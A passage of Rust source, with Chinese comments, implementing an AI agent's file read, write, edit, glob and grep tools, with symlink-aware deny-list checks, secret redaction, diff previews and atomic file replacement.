#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct GlobResult {
    pub root: String,
    /// 绝对路径，按修改时间从新到旧
    pub files: Vec<String>,
    /// 命中数超出上限或遍历被上限截断
    pub truncated: bool,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct GrepMatch {
    pub path: String,
    pub line: usize,
    pub text: String,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct GrepResult {
    pub matches: Vec<GrepMatch>,
    pub files_scanned: usize,
    /// 结果数、文件数、字节数或遍历任一上限被触发
    pub truncated: bool,
    /// 有匹配行被脱敏改动过（匹配文本已是脱敏后的）
    pub sensitive: bool,
    /// 因命中禁读清单而跳过、没有搜索的文件数
    pub skipped_protected: usize,
}

impl GlobResult {
    /// 给模型看的纯文本
    pub fn to_model_text(&self) -> String {
        if self.files.is_empty() {
            return format!("在 {} 下没有匹配的文件", self.root);
        }
        let mut s = self.files.join("\n");
        if self.truncated {
            s.push_str("\n（结果已截断：缩小 path 或写更具体的 pattern）");
        }
        s
    }
}

impl GrepResult {
    pub fn to_model_text(&self) -> String {
        let skipped = if self.skipped_protected > 0 {
            format!(
                "（跳过了 {} 个受保护文件（密钥 / 凭据）：需要用户批准才能读取，确有必要请对单个文件用 nx_read）\n",
                self.skipped_protected
            )
        } else {
            String::new()
        };
        if self.matches.is_empty() {
            return format!("没有匹配（扫描了 {} 个文件）\n{skipped}", self.files_scanned);
        }
        let mut s: String = self
            .matches
            .iter()
            .map(|m| format!("{}:{}:{}\n", m.path, m.line, m.text))
            .collect();
        if self.truncated {
            s.push_str("（结果已截断：缩小 path、加 glob 过滤或写更具体的正则）\n");
        }
        s.push_str(&skipped);
        s
    }
}

// ——————————————————————————————— 工具参数 ———————————————————————————————

#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ReadArgs {
    pub target: Option<String>,
    pub path: String,
    pub offset: Option<usize>,
    pub limit: Option<usize>,
}

#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct WriteArgs {
    pub target: Option<String>,
    pub path: String,
    pub content: String,
    #[serde(default)]
    pub create_dirs: bool,
}

#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct EditArgs {
    pub target: Option<String>,
    pub path: String,
    pub old_string: String,
    pub new_string: String,
    #[serde(default)]
    pub replace_all: bool,
}

#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct GlobArgs {
    pub target: Option<String>,
    pub pattern: String,
    pub path: Option<String>,
    pub max_results: Option<usize>,
}

#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct GrepArgs {
    pub target: Option<String>,
    pub pattern: String,
    pub path: Option<String>,
    pub glob: Option<String>,
    #[serde(default)]
    pub case_insensitive: bool,
    pub max_results: Option<usize>,
}

// ——————————————————————————————— 操作 ———————————————————————————————

/// 在某个 transport 上执行文件操作。家目录只问一次（远端是一次往返）。
pub struct FileOps<'a> {
    t: &'a dyn FileTransport,
    cfg: FileOpsConfig,
    home: tokio::sync::OnceCell<String>,
}

impl<'a> FileOps<'a> {
    pub fn new(t: &'a dyn FileTransport, cfg: FileOpsConfig) -> Self {
        Self { t, cfg, home: tokio::sync::OnceCell::new() }
    }

    pub fn config(&self) -> &FileOpsConfig {
        &self.cfg
    }

    async fn home(&self) -> Result<&str, FileError> {
        self.home
            .get_or_try_init(|| async { self.t.home().await.map(|h| normalize(&to_slash(&h))) })
            .await
            .map(|s| s.as_str())
    }

    /// 校验并规整路径：拒绝 NUL、展开 `~`、要求绝对路径、折叠 `.`/`..`。
    pub async fn resolve(&self, path: &str) -> Result<String, FileError> {
        if path.is_empty() {
            return Err(FileError::InvalidPath("路径为空".into()));
        }
        if path.contains('\0') {
            return Err(FileError::InvalidPath("路径里含 NUL 字符".into()));
        }
        let p = to_slash(path);
        let expanded = if p == "~" {
            self.home().await?.to_string()
        } else if let Some(rest) = p.strip_prefix("~/") {
            join(self.home().await?, rest)
        } else if p.starts_with('~') {
            return Err(FileError::InvalidPath(format!("不支持「~用户名」写法：{path}")));
        } else {
            p
        };
        if !self.t.is_absolute(&expanded) {
            return Err(FileError::InvalidPath(format!(
                "需要绝对路径或以 ~ 开头（终端当前目录未知）：{path}"
            )));
        }
        Ok(normalize(&expanded))
    }

    /// 写入实际会落到哪里：已存在的路径取 realpath（跟随符号链接，与 `atomic_replace` 一致）；
    /// 还不存在的新文件取父目录的 realpath + 文件名。拿不到返回 None。
    pub async fn real_target(&self, path: &str) -> Option<String> {
        if let Some(real) = self.t.realpath(path).await {
            return Some(normalize(&to_slash(&real)));
        }
        let parent = parent_of(path)?;
        let real = self.t.realpath(parent).await?;
        Some(join(&normalize(&to_slash(&real)), file_name(path)))
    }

    /// 路径是否命中禁写清单（字面路径与真实路径都查，防符号链接绕过）
    pub async fn is_denied(&self, path: &str) -> Result<bool, FileError> {
        let c = self.candidates(path).await;
        Ok(self.hits_any(&c, &self.cfg.deny).await)
    }

    /// 路径是否命中禁读清单（同样看穿符号链接）
    pub async fn is_read_denied(&self, path: &str) -> Result<bool, FileError> {
        let c = self.candidates(path).await;
        Ok(self.hits_any(&c, &self.cfg.read_deny).await)
    }

    /// 字面路径 + 真实路径（文件不存在时取父目录的真实路径拼上文件名）
    async fn candidates(&self, path: &str) -> Vec<String> {
        let mut candidates = vec![path.to_string()];
        if let Some(real) = self.t.realpath(path).await {
            candidates.push(normalize(&real));
        } else if let Some(parent) = parent_of(path) {
            // 文件还不存在：解析父目录，防止「指向 ~/.ssh 的链接目录/新文件」
            if let Some(real) = self.t.realpath(parent).await {
                candidates.push(join(&normalize(&real), file_name(path)));
            }
        }
        candidates
    }

    /// 任一候选路径命中任一规则。规则以 `/` 结尾 = 目录前缀；含通配符 = glob（`*` 不跨 `/`）；否则精确匹配。
    async fn hits_any(&self, candidates: &[String], rules: &[String]) -> bool {
        for rule in rules {
            let expanded = if rule == "~" || rule.starts_with("~/") {
                // 家目录拿不到就跳过 ~ 规则，不能因此把所有操作都拦掉
                match self.home().await {
                    Ok(h) => format!("{h}{}", &rule[1..]),
                    Err(_) => continue,
                }
            } else {
                rule.clone()
            };
            if candidates.iter().any(|c| rule_hits(&expanded, rule.ends_with('/'), c)) {
                return true;
            }
        }
        false
    }

    async fn check_writable(&self, path: &str, allow_sensitive: bool) -> Result<(), FileError> {
        if !allow_sensitive && self.is_denied(path).await? {
            return Err(FileError::Denied(path.to_string()));
        }
        Ok(())
    }

    // —— read ——

    /// 读文本文件，返回带行号的片段。`offset` 是 1 起的行号，`limit` 是行数。
    /// 禁读清单里的路径报 [`FileError::ReadDenied`]（只含元数据），见 [`Self::read_with`]。
    pub async fn read(
        &self,
        path: &str,
        offset: Option<usize>,
        limit: Option<usize>,
    ) -> Result<ReadResult, FileError> {
        self.read_with(path, offset, limit, false).await
    }

    /// 同 [`Self::read`]；`allow_sensitive` 越过禁读清单 —— 只能在用户批准了一张写明该路径的卡之后置位，
    /// 且内容照样脱敏。
    pub async fn read_with(
        &self,
        path: &str,
        offset: Option<usize>,
        limit: Option<usize>,
        allow_sensitive: bool,
    ) -> Result<ReadResult, FileError> {
        let path = self.resolve(path).await?;
        let st = self.t.stat(&path).await?.ok_or_else(|| FileError::NotFound(path.clone()))?;
        if st.is_dir {
            return Err(FileError::IsDirectory(path));
        }
        let denied = self.is_read_denied(&path).await?;
        if denied && !allow_sensitive {
            return Err(FileError::ReadDenied { path, size: st.size });
        }
        if st.size > self.cfg.read_cap as u64 {
            return Err(FileError::TooLarge { path, size: st.size, cap: self.cfg.read_cap });
        }
        let bytes = self.t.read(&path, self.cfg.read_cap).await?;
        if looks_binary(&bytes) {
            return Err(FileError::Binary(path));
        }
        let (text, lossy) = match std::str::from_utf8(&bytes) {
            Ok(s) => (std::borrow::Cow::Borrowed(s), false),
            Err(_) => (String::from_utf8_lossy(&bytes), true),
        };

        // 先对整份原文脱敏（行数不变），再切片编行号：行号前缀不会让 PEM 正文躲过扫描，
        // 截在私钥中间的 offset/limit 也不会让扫描器失去上下文
        let redacted = super::redact::redact_lines(&text);
        let sensitive = denied || redacted != *text;
        let total = text.lines().count();
        let start = offset.unwrap_or(1).max(1);
        let limit = limit.unwrap_or(DEFAULT_READ_LINES).max(1);
        if total > 0 && start > total {
            return Err(FileError::InvalidArg(format!(
                "offset {start} 超出文件行数（共 {total} 行）"
            )));
        }
        let mut content = String::new();
        let mut n = 0;
        for (i, line) in redacted.lines().enumerate().skip(start - 1).take(limit) {
            let line = line.strip_suffix('\r').unwrap_or(line);
            content.push_str(&format!("{:>6}\t{}\n", i + 1, truncate_chars(line, MAX_LINE_CHARS)));
            n += 1;
        }
        Ok(ReadResult {
            sha256: sha256_hex(&bytes),
            path,
            content,
            start_line: start,
            lines_returned: n,
            total_lines: total,
            truncated: start - 1 + n < total,
            lossy,
            sensitive,
        })
    }

    // —— write / edit ——

    /// 读现有文件做对比用。过大返回 None（不读，也就没有 before_hash）。
    async fn read_existing(&self, path: &str, st: &FileStat) -> Result<Option<Vec<u8>>, FileError> {
        let cap = self.cfg.read_cap.max(self.cfg.write_cap);
        if st.size > cap as u64 {
            return Ok(None);
        }
        self.t.read(path, cap).await.map(Some)
    }

    /// 计算整文件写入的修改，不落盘。
    pub async fn prepare_write(
        &self,
        path: &str,
        content: &str,
        opts: &WriteOptions,
    ) -> Result<PendingChange, FileError> {
        let path = self.resolve(path).await?;
        if content.len() > self.cfg.write_cap {
            return Err(FileError::TooLarge {
                path,
                size: content.len() as u64,
                cap: self.cfg.write_cap,
            });
        }
        self.check_writable(&path, opts.allow_sensitive).await?;

        let st = self.t.stat(&path).await?;
        let (before, mode) = match &st {
            Some(s) if s.is_dir => return Err(FileError::IsDirectory(path)),
            Some(s) => (self.read_existing(&path, s).await?, s.mode),
            None => {
                self.check_parent(&path, opts.create_dirs).await?;
                (None, None)
            }
        };
        let after = content.as_bytes();
        let (diff, complete) = match &before {
            Some(b) if looks_binary(b) => (
                format!("{DIFF_INCOMPLETE_MARK}：原文件是二进制，看不到差异，将被整个替换为 {} 字节的新内容", after.len()),
                false,
            ),
            Some(b) => diff_preview(&path, &String::from_utf8_lossy(b), content),
            None if st.is_some() => (
                format!(
                    "{DIFF_INCOMPLETE_MARK}：原文件过大（{} 字节），不生成差异，将被整个替换为 {} 字节的新内容",
                    st.as_ref().map_or(0, |s| s.size),
                    after.len()
                ),
                false,
            ),
            None => diff_preview(&path, "", content),
        };
        // 过大没读的原文件也要有 before_hash（流式计算），否则 commit 的冲突复核会被跳过
        let before_hash = match (&before, &st) {
            (Some(b), _) => Some(sha256_hex(b)),
            (None, Some(_)) => Some(self.t.sha256(&path).await?),
            (None, None) => None,
        };
        Ok(PendingChange {
            change: FileChange {
                created: st.is_none(),
                before_hash,
                after_hash: sha256_hex(after),
                bytes: after.len(),
                replacements: 0,
                sensitive: super::redact::redact(&diff) != diff,
                atomic: false,
                preview_complete: complete,
                diff_preview: diff,
                path,
            },
            preview_complete: complete,
            content: after.to_vec(),
            mode,
            create_dirs: opts.create_dirs,
            existed: st.is_some(),
        })
    }

    /// 计算一次字符串替换，不落盘。语义同 Claude Code 的 Edit：
    /// `old_string` 必须存在；不是 `replace_all` 时还必须唯一。
    pub async fn prepare_edit(
        &self,
        path: &str,
        old_string: &str,
        new_string: &str,
        replace_all: bool,
        allow_sensitive: bool,
    ) -> Result<PendingChange, FileError> {
        if old_string.is_empty() {
            return Err(FileError::InvalidArg("old_string 不能为空（新建文件请用 nx_write）".into()));
        }
        if old_string == new_string {
            return Err(FileError::InvalidArg("old_string 与 new_string 相同，没有可改的".into()));
        }
        let path = self.resolve(path).await?;
        self.check_writable(&path, allow_sensitive).await?;
        let st = self.t.stat(&path).await?.ok_or_else(|| FileError::NotFound(path.clone()))?;
        if st.is_dir {
            return Err(FileError::IsDirectory(path));
        }
        if st.size > self.cfg.write_cap as u64 {
            return Err(FileError::TooLarge { path, size: st.size, cap: self.cfg.write_cap });
        }
        let bytes = self.t.read(&path, self.cfg.write_cap).await?;
        if looks_binary(&bytes) {
            return Err(FileError::Binary(path));
        }
        let text = std::str::from_utf8(&bytes).map_err(|_| {
            FileError::Edit(format!("「{path}」不是合法 UTF-8，拒绝编辑以免损坏内容"))
        })?;

        // 模型给的总是 LF；文件若是 CRLF，换成 CRLF 再找一次
        let (mut old, mut new) = (old_string.to_string(), new_string.to_string());
        let mut count = text.matches(&old).count();
        if count == 0 && text.contains("\r\n") && old.contains('\n') && !old.contains("\r\n") {
            let crlf_old = old.replace('\n', "\r\n");
            let c = text.matches(&crlf_old).count();
            if c > 0 {
                old = crlf_old;
                new = new.replace("\r\n", "\n").replace('\n', "\r\n");
                count = c;
            }
        }
        if count == 0 {
            return Err(FileError::Edit(format!(
                "在「{path}」里没找到 old_string。请先 nx_read 确认原文（缩进、空白、换行都要一字不差）"
            )));
        }
        if count > 1 && !replace_all {
            return Err(FileError::Edit(format!(
                "old_string 在「{path}」里出现了 {count} 次，不唯一：加上更多上下文使其唯一，或设 replaceAll=true"
            )));
        }
        let after = if replace_all { text.replace(&old, &new) } else { text.replacen(&old, &new, 1) };
        if after.len() > self.cfg.write_cap {
            return Err(FileError::TooLarge {
                path,
                size: after.len() as u64,
                cap: self.cfg.write_cap,
            });
        }
        let (diff, complete) = diff_preview(&path, text, &after);
        Ok(PendingChange {
            change: FileChange {
                created: false,
                before_hash: Some(sha256_hex(&bytes)),
                after_hash: sha256_hex(after.as_bytes()),
                bytes: after.len(),
                replacements: if replace_all { count } else { 1 },
                sensitive: super::redact::redact(&diff) != diff,
                atomic: false,
                preview_complete: complete,
                diff_preview: diff,
                path,
            },
            preview_complete: complete,
            content: after.into_bytes(),
            mode: st.mode,
            create_dirs: false,
            existed: true,
        })
    }

    /// 把预览过的修改落盘。会复核文件是否在预览之后被改过（哈希 / 存在性），
    /// 被改过就报 [`FileError::Conflict`]，绝不拿旧内容覆盖新内容。
    pub async fn commit(&self, p: &PendingChange) -> Result<FileChange, FileError> {
        let path = &p.change.path;
        let st = self.t.stat(path).await?;
        match (&st, p.existed) {
            (None, true) | (Some(_), false) => return Err(FileError::Conflict(path.clone())),
            (Some(s), true) => {
                if s.is_dir {
                    return Err(FileError::IsDirectory(path.clone()));
                }
                if let Some(expect) = &p.change.before_hash {
                    // 小文件整读，过大的流式算（与 prepare 时一致），保证每次都复核
                    let now = match self.read_existing(path, s).await? {
                        Some(b) => sha256_hex(&b),
                        None => self.t.sha256(path).await?,
                    };
                    if &now != expect {
                        return Err(FileError::Conflict(path.clone()));
                    }
                }
            }
            (None, false) => self.check_parent(path, p.create_dirs).await?,
        }
        let atomic = self.atomic_replace(path, &p.content, p.mode, st.is_some()).await?;
        Ok(FileChange { atomic, ..p.change.clone() })
    }

    /// 整文件写入（预览 + 落盘一步到位，不经审批的调用方用）
    pub async fn write(
        &self,
        path: &str,
        content: &str,
        opts: &WriteOptions,
    ) -> Result<FileChange, FileError> {
        let p = self.prepare_write(path, content, opts).await?;
        self.commit(&p).await
    }

    /// 字符串替换（预览 + 落盘一步到位）
    pub async fn edit(
        &self,
        path: &str,
        old_string: &str,
        new_string: &str,
        replace_all: bool,
        allow_sensitive: bool,
    ) -> Result<FileChange, FileError> {
        let p = self
            .prepare_edit(path, old_string, new_string, replace_all, allow_sensitive)
            .await?;
        self.commit(&p).await
    }

    /// 父目录必须存在且是目录；`create` 时逐级创建
    async fn check_parent(&self, path: &str, create: bool) -> Result<(), FileError> {
        let Some(parent) = parent_of(path) else {
            return Err(FileError::InvalidPath(format!("「{path}」没有父目录")));
        };
        match self.t.stat(parent).await? {
            Some(s) if s.is_dir => Ok(()),
            Some(_) => Err(FileError::InvalidPath(format!("「{parent}」不是目录"))),
            None if create => self.mkdir_p(parent).await,
            None => Err(FileError::NotFound(format!(
                "父目录 {parent}（如需创建请设 createDirs=true）"
            ))),
        }
    }

    async fn mkdir_p(&self, dir: &str) -> Result<(), FileError> {
        // 自底向上找到第一个存在的祖先，再自顶向下逐级创建
        let mut missing = Vec::new();
        let mut cur = dir.to_string();
        loop {
            match self.t.stat(&cur).await? {
                Some(s) if s.is_dir => break,
                Some(_) => return Err(FileError::InvalidPath(format!("「{cur}」不是目录"))),
                None => {
                    missing.push(cur.clone());
                    match parent_of(&cur) {
                        Some(p) => cur = p.to_string(),
                        None => break,
                    }
                }
            }
        }
        for d in missing.iter().rev() {
            self.t.mkdir(d).await?;
        }
        Ok(())
    }

    /// 原子替换：同目录写临时文件（创建时即带原权限）→ 还原属主 → 改名到位。
    /// 返回是否原子（见 [`FileChange::atomic`]）。
    ///
    /// 落到哪里：
    /// - 目标是符号链接 → 解析成真实路径，替换**链接指向的文件**，链接本身保留；
    /// - 目标有多个硬链接 → 改名会把它从其它链接上拆开，改为原地截断重写（不原子，返回 false）。
    ///
    /// 改名到位的顺序：
    /// 1. transport 支持原子覆盖（本地 rename、远端 `posix-rename@openssh.com`）→ 一步换掉；
    /// 2. 不支持且目标不存在 → 普通 rename（新建本身就是原子的）；
    /// 3. 不支持且目标存在（SFTPv3 rename 不覆盖）→ 原文件改名成备份 → 临时文件改名到位 →
    ///    删备份。中间有极短窗口目标不存在；第二步失败会把备份改回去，
    ///    改不回去时错误里给出备份路径，绝不静默丢掉原文件。
    ///
    /// 已知不保留：ACL 与扩展属性（xattr）。
    async fn atomic_replace(
        &self,
        path: &str,
        bytes: &[u8],
        mode: Option<u32>,
        exists: bool,
    ) -> Result<bool, FileError> {
        // 符号链接：写到它指向的文件上（realpath 只在目标存在时才有意义）
        let resolved = if exists {
            self.t.realpath(path).await.map(|r| normalize(&r)).filter(|r| r != path)
        } else {
            None
        };
        let path = resolved.as_deref().unwrap_or(path);

        if exists && self.t.link_count(path).await.is_some_and(|n| n > 1) {
            // 硬链接：原地写，所有链接看到同一份新内容；权限 / 属主本来就没变
            tracing::warn!(path, "目标有多个硬链接：改为原地重写（非原子）");
            self.t.write(path, bytes).await?;
            return Ok(false);
        }

        let parent = parent_of(path)
            .ok_or_else(|| FileError::InvalidPath(format!("「{path}」没有父目录")))?;
        let name = file_name(path);
        let tag = &uuid::Uuid::new_v4().simple().to_string()[..8];
        let tmp = join(parent, &format!(".{name}.nxtmp-{tag}"));

        // 临时文件从诞生起就是原文件的权限（0600 的秘密不会有一刻全世界可读）
        if let Err(e) = self.t.create_with_mode(&tmp, bytes, mode.map(|m| m & 0o7777)).await {
            let _ = self.t.remove(&tmp).await;
            return Err(e);
        }
        if let Some(m) = mode {
            // 创建时的权限还要与 umask 相与，这里补齐成原样（比如 0755 在 umask 077 下）。
            // 失败不致命（比如文件属主不是自己），但脚本丢 +x 要让人知道
            if let Err(e) = self.t.set_mode(&tmp, m & 0o7777).await {
                tracing::warn!(path, error = %e, "原子写：还原权限失败");
            }
        }
        if exists {
            // 以 root 替换别人的文件时把属主 / 属组抄回去；非 root 做不到就告警
            if let Err(e) = self.t.copy_owner(path, &tmp).await {
                tracing::warn!(path, error = %e, "原子写：还原属主失败");
            }
        }

        match self.t.rename_atomic(&tmp, path).await {
            Ok(true) => return Ok(true),
            Ok(false) => {}
            Err(e) => {
                let _ = self.t.remove(&tmp).await;
                return Err(e);
            }
        }
        if !exists {
            return match self.t.rename(&tmp, path).await {
                Ok(()) => Ok(true),
                Err(e) => {
                    let _ = self.t.remove(&tmp).await;
                    Err(e)
                }
            };
        }

        let bak = join(parent, &format!(".{name}.nxbak-{tag}"));
        if let Err(e) = self.t.rename(path, &bak).await {
            let _ = self.t.remove(&tmp).await;
            return Err(e);
        }
        if let Err(e) = self.t.rename(&tmp, path).await {
            let _ = self.t.remove(&tmp).await;
            return Err(match self.t.rename(&bak, path).await {
                Ok(()) => FileError::Io(format!(
                    "替换「{path}」失败，原文件已还原（若还原不完整，备份可能残留在 {bak}）：{e}"
                )),
                Err(e2) => FileError::Io(format!(
                    "替换「{path}」失败且未能还原：原文件现位于 {bak}，请手动改回。替换错误：{e}；还原错误：{e2}"
                )),
            });
        }
        if let Err(e) = self.t.remove(&bak).await {
            tracing::warn!(path, backup = %bak, error = %e, "原子写：删除备份失败");
        }
        Ok(false)
    }

    // —— glob / grep ——

    /// 广度优先遍历 `root` 下的文件（不含目录），返回 (相对路径, 项)，以及是否被上限截断。
    async fn walk_files(
        &self,
        root: &str,
        max_depth: usize,
    ) -> Result<(Vec<(String, DirEntry)>, bool), FileError> {
        let lim = &self.cfg.walk;
        let mut out = Vec::new();
        let mut truncated = false;
        let mut queue: VecDeque<(String, String, usize)> = VecDeque::new();
        queue.push_back((root.to_string(), String::new(), 0));
        let (mut dirs, mut entries) = (0usize, 0usize);
        while let Some((dir, rel, depth)) = queue.pop_front() {
            if dirs >= lim.max_dirs {
                truncated = true;
                break;
            }
            dirs += 1;
            let list = match self.t.list(&dir).await {
                Ok(l) => l,
                // 根目录列不出来是真错误；子目录（没权限等）跳过即可
                Err(e) if depth == 0 => return Err(e),
                Err(_) => continue,
            };
            for e in list {
                entries += 1;
                if entries > lim.max_entries {
                    truncated = true;
                    return Ok((out, truncated));
                }
                let r = if rel.is_empty() { e.name.clone() } else { format!("{rel}/{}", e.name) };
                if e.is_dir {
                    if lim.skip_dirs.iter().any(|s| s == &e.name) {
                        continue;
                    }
                    if depth + 1 < max_depth {
                        queue.push_back((e.path.clone(), r, depth + 1));
                    } else if max_depth >= lim.max_depth {
                        // 是被全局深度上限截住的，而不是 pattern 本身用不到更深
                        truncated = true;
                    }
                } else {
                    out.push((r, e));
                }
            }
        }
        Ok((out, truncated))
    }

    /// 按通配符找文件。`pattern` 相对 `path`（默认家目录）；
    /// 也接受绝对 / `~` 开头的 pattern，此时取其中不含通配符的前缀当根。
    pub async fn glob(
        &self,
        path: Option<&str>,
        pattern: &str,
        max_results: usize,
    ) -> Result<GlobResult, FileError> {
        if pattern.is_empty() {
            return Err(FileError::InvalidArg("pattern 为空".into()));
        }
        let (root, pattern) = if pattern.starts_with('/') || pattern.starts_with('~') {
            let segs: Vec<&str> = pattern.split('/').collect();
            let lit = segs.iter().take_while(|s| !has_glob_meta(s)).count();
            if lit == segs.len() {
                return Err(FileError::InvalidArg("pattern 里没有通配符，直接用 nx_read".into()));
            }
            let root = segs[..lit].join("/");
            let root = if root.is_empty() { "/".to_string() } else { root };
            (self.resolve(&root).await?, segs[lit..].join("/"))
        } else {
            (self.resolve(path.unwrap_or("~")).await?, pattern.to_string())
        };
        let re = glob_to_regex(&pattern)?;
        let depth = if pattern.contains("**") {
            self.cfg.walk.max_depth
        } else {
            pattern.split('/').count().min(self.cfg.walk.max_depth)
        };
        let (files, mut truncated) = self.walk_files(&root, depth).await?;
        let mut hits: Vec<DirEntry> =
            files.into_iter().filter(|(rel, _)| re.is_match(rel)).map(|(_, e)| e).collect();
        hits.sort_by(|a, b| b.mtime.cmp(&a.mtime).then_with(|| a.path.cmp(&b.path)));
        let max = max_results.max(1);
        if hits.len() > max {
            hits.truncate(max);
            truncated = true;
        }
        Ok(GlobResult { root, files: hits.into_iter().map(|e| e.path).collect(), truncated })
    }

    /// 按正则搜文件内容。`path` 可以是单个文件或目录（默认家目录）；
    /// `glob` 过滤文件：不含 `/` 时只匹配文件名（同 ripgrep），否则匹配相对路径。
    pub async fn grep(
        &self,
        path: Option<&str>,
        pattern: &str,
        glob: Option<&str>,
        case_insensitive: bool,
        max_results: usize,
    ) -> Result<GrepResult, FileError> {
        let re = regex::RegexBuilder::new(pattern)
            .case_insensitive(case_insensitive)
            .size_limit(1 << 20)
            .build()
            .map_err(|e| FileError::BadPattern(e.to_string()))?;
        let filter = glob.map(|g| (glob_to_regex(g), g.contains('/')));
        let filter = match filter {
            Some((Ok(r), by_path)) => Some((r, by_path)),
            Some((Err(e), _)) => return Err(e),
            None => None,
        };
        let root = self.resolve(path.unwrap_or("~")).await?;
        let st = self.t.stat(&root).await?.ok_or_else(|| FileError::NotFound(root.clone()))?;
        if !st.is_dir && self.is_read_denied(&root).await? {
            return Err(FileError::ReadDenied { path: root, size: st.size });
        }
        let (files, mut truncated) = if st.is_dir {
            self.walk_files(&root, self.cfg.walk.max_depth).await?
        } else {
            let name = file_name(&root).to_string();
            let e = DirEntry {
                name: name.clone(),
                path: root.clone(),
                is_dir: false,
                size: st.size,
                mtime: st.mtime,
            };
            (vec![(name, e)], false)
        };

        let max = max_results.max(1);
        let mut matches = Vec::new();
        let (mut scanned, mut bytes_scanned, mut skipped_protected) = (0usize, 0u64, 0usize);
        let mut sensitive = false;
        'files: for (rel, e) in files {
            if let Some((r, by_path)) = &filter {
                let subject = if *by_path { rel.as_str() } else { e.name.as_str() };
                if !r.is_match(subject) {
                    continue;
                }
            }
            if e.size == 0 || e.size > self.cfg.read_cap as u64 {
                continue;
            }
            // 遍历出来的每个文件只按字面路径查禁读清单（远端每个 realpath 都是一次往返）；
            // 指向清单内文件的符号链接漏过这一步也不怕：输出照样逐行脱敏
            if self.hits_any(std::slice::from_ref(&e.path), &self.cfg.read_deny).await {
                skipped_protected += 1;
                continue;
            }
            if scanned >= self.cfg.grep_max_files
                || bytes_scanned + e.size > self.cfg.grep_max_bytes
            {
                truncated = true;
                break;
            }
            let Ok(bytes) = self.t.read(&e.path, self.cfg.read_cap).await else { continue };
            scanned += 1;
            bytes_scanned += bytes.len() as u64;
            if looks_binary(&bytes) {
                continue;
            }
            let text = String::from_utf8_lossy(&bytes);
            // 匹配用原文，展示用整份脱敏（行数不变）后的同一行：单独一行 PEM 正文看不出是私钥，
            // 放在整个文件里扫描才认得出来
            let mut redacted: Option<Vec<String>> = None;
            for (i, line) in text.lines().enumerate() {
                if re.is_match(line) {
                    if matches.len() >= max {
                        truncated = true;
                        break 'files;
                    }
                    let shown = redacted
                        .get_or_insert_with(|| super::redact::redact_lines(&text).lines().map(str::to_string).collect())
                        .get(i)
                        .map(String::as_str)
                        .unwrap_or(super::redact::PLACEHOLDER);
                    if shown != line {
                        sensitive = true;
                    }
                    let shown = shown.strip_suffix('\r').unwrap_or(shown);
                    matches.push(GrepMatch {
                        path: e.path.clone(),
                        line: i + 1,
                        text: truncate_chars(shown, GREP_LINE_CHARS),
                    });
                }
            }
        }
        Ok(GrepResult { matches, files_scanned: scanned, truncated, sensitive, skipped_protected })
    }
}

// ——————————————————————————————— 差异预览 ———————————————————————————————

/// 一步编辑：`Eq(i, j)` = a[i] 与 b[j] 相同；`Del(i)` 删 a[i]；`Ins(j)` 插 b[j]。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum DiffOp {
    Eq(usize, usize),
    Del(usize),
    Ins(usize),
}

/// Myers 最短编辑脚本。编辑距离超过 `max_d` 时放弃（返回 None）：
/// 那时差异行数必然超过预览上限，算出来也展示不完。内存 O(D²)，时间 O((N+M)·D)。
fn myers(a: &[&str], b: &[&str], max_d: usize) -> Option<Vec<DiffOp>> {
    let (n, m) = (a.len() as isize, b.len() as isize);
    let lim = (a.len() + b.len()).min(max_d) as isize;
    let off = lim + 1;
    let mut v = vec![0isize; (2 * lim + 3) as usize];
    // trace[d] = 第 d 轮开始前 v 在 k ∈ [-d, d] 上的快照，回溯用
    let mut trace: Vec<Vec<isize>> = Vec::new();
    let mut done = None;
    'outer: for d in 0..=lim {
        trace.push(v[(off - d) as usize..=(off + d) as usize].to_vec());
        let mut k = -d;
        while k <= d {
            let mut x = if k == -d || (k != d && v[(off + k - 1) as usize] < v[(off + k + 1) as usize]) {
                v[(off + k + 1) as usize]
            } else {
                v[(off + k - 1) as usize] + 1
            };
            let mut y = x - k;
            while x < n && y < m && a[x as usize] == b[y as usize] {
                x += 1;
                y += 1;
            }
            v[(off + k) as usize] = x;
            if x >= n && y >= m {
                done = Some(d);
                break 'outer;
            }
            k += 2;
        }
    }
    let dmax = done?;
    let mut ops = Vec::new();
    let (mut x, mut y) = (n, m);
    for d in (1..=dmax).rev() {
        let vp = &trace[d as usize];
        let at = |k: isize| vp[(k + d) as usize];
        let k = x - y;
        let prev_k = if k == -d || (k != d && at(k - 1) < at(k + 1)) { k + 1 } else { k - 1 };
        let prev_x = at(prev_k);
        let prev_y = prev_x - prev_k;
        while x > prev_x && y > prev_y {
            x -= 1;
            y -= 1;
            ops.push(DiffOp::Eq(x as usize, y as usize));
        }
        if x == prev_x {
            y -= 1;
            ops.push(DiffOp::Ins(y as usize));
        } else {
            x -= 1;
            ops.push(DiffOp::Del(x as usize));
        }
    }
    while x > 0 && y > 0 {
        x -= 1;
        y -= 1;
        ops.push(DiffOp::Eq(x as usize, y as usize));
    }
    ops.reverse();
    Some(ops)
}

/// 编辑脚本：公共前后缀直接算相同，中间交给 Myers。算不动时退化成「中间整段删 + 整段加」——
/// 仍然**覆盖全部修改**，只是不够精细（随后会因超出上限被标成不完整）。
fn diff_ops(a: &[&str], b: &[&str]) -> Vec<DiffOp> {
    let prefix = a.iter().zip(b).take_while(|(x, y)| x == y).count();
    let max_suffix = a.len().min(b.len()) - prefix;
    let suffix =
        a.iter().rev().zip(b.iter().rev()).take(max_suffix).take_while(|(x, y)| x == y).count();
    let (a_mid, b_mid) = (&a[prefix..a.len() - suffix], &b[prefix..b.len() - suffix]);

    let mut ops: Vec<DiffOp> = (0..prefix).map(|i| DiffOp::Eq(i, i)).collect();
    match myers(a_mid, b_mid, DIFF_PREVIEW_MAX_LINES) {
        Some(mid) => ops.extend(mid.into_iter().map(|op| match op {
            DiffOp::Eq(i, j) => DiffOp::Eq(i + prefix, j + prefix),
            DiffOp::Del(i) => DiffOp::Del(i + prefix),
